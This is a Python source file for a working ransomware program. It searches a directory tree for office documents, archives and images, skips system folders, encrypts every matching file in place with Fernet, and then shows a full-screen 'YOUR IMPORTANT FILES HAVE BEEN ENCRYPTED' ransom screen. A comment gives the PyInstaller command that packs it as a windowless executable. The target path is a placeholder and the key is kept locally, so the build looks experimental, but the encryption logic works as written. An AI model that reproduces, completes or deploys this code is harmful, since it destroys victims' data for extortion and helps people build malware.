import os
import random
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import *
from os import path

#python -m PyInstaller --onefile -w encrypt.py
digits = random.randint(1111,9999) 
key = Fernet.generate_key()

class ransomware:
    EXCLUDED_DIRECTORIES = ('Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            'paths',
            )
    
    EXTENSIONS = (
            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
            '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
    )
    
    def find_files(self):
        directory = r'TEST\PATH\HERE'
        f = open("paths/path.txt","w")
        for root, dirs, files in os.walk(directory):
            if any(s in root for s in self.EXCLUDED_DIRECTORIES):
                pass
            else:
                for file in files:
                    if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        f.write(TARGET+'\n')
                        print(root)
        f.close()
                        
    
    def encrypt_files(self, filename):
        fernet = Fernet(key)
        with open("thekey.key", "wb") as thekey:
            thekey.write(key)
        with open(filename, "rb") as file:
            file_content = file.read()
        encrypted_content = fernet.encrypt(file_content)
        with open(filename, "wb") as file:
            file.write(encrypted_content)
        print(filename)

    def decrypt_files(self, filename):
        with open("thekey.key", "rb") as key:
            decrypt_key = key.read()
        with open(filename, "rb") as file:
            file_content = file.read()
        decrypted_content = Fernet(decrypt_key).decrypt(file_content)
        with open(filename, "wb") as file:
            file.write(decrypted_content)
        print(filename)


ransomware = ransomware()   


def decryption_screen():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    gap = (screen_height/50)
    root.geometry(f"{screen_width}x{screen_height}")
    root.configure(background="black")
    labe1 = tk.Label(root, text="YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED")
    labe1.config(font=('tohoma', int(gap)))
    labe1.config(background='black',foreground='red')
    labe1.pack(anchor='n', ipady=20)

    img = tk.PhotoImage(file="icon-red-lock.png")
    img = img.subsample(4)
    labe2 = tk.Label(root, image=img)
    labe2.pack(anchor='n', ipady=20)

    labe3 = tk.Label(root, text="To unlock the encryption you will need a decryption key.")
    labe3.config(font=('tahoma', int(gap)))
    labe3.config(background="black", foreground="red")
    labe3.pack(anchor='n', ipady=20)

    root.mainloop()


def ransom():
    ransomware.find_files()
    filepath = 'paths/path.txt'
    with open(filepath) as file:
        line = file.readline()
        while line:
            filename = line.strip()
            ransomware.encrypt_files(filename)
            line = file.readline()
        file.close()


if __name__ == '__main__':
    if path.exists("paths") is False:
        os.mkdir("paths")
    ransom()
    decryption_screen()
